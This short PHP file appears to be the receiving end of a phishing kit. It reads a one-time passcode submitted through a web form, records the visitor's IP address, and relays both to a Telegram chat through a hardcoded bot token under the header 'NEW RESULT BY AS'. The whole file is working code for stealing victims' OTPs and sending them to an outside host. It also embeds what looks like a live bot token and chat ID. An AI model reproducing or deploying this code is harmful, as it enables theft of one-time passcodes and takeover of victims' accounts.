<?php 

	use Telegram\Bot\Api;
	require_once('vendor/autoload.php');

	$otp = $_POST["otp"];


	$message =  "NEW RESULT BY AS"."\r\n"."===================";
	$message2 = "OTP : ".$otp;
    $message2 = $message2."\r\nIP : ".$_SERVER['REMOTE_ADDR'];



	$telegram = new Api('1093092007:AAEVvKU8GCMQjq-ohjQqfUrfelzPHkJf80A');


	$response = $telegram->sendMessage([
		    'chat_id' => '-1001951518881', 
		    'text' => $message."\r\n".$message2
	]);





 ?>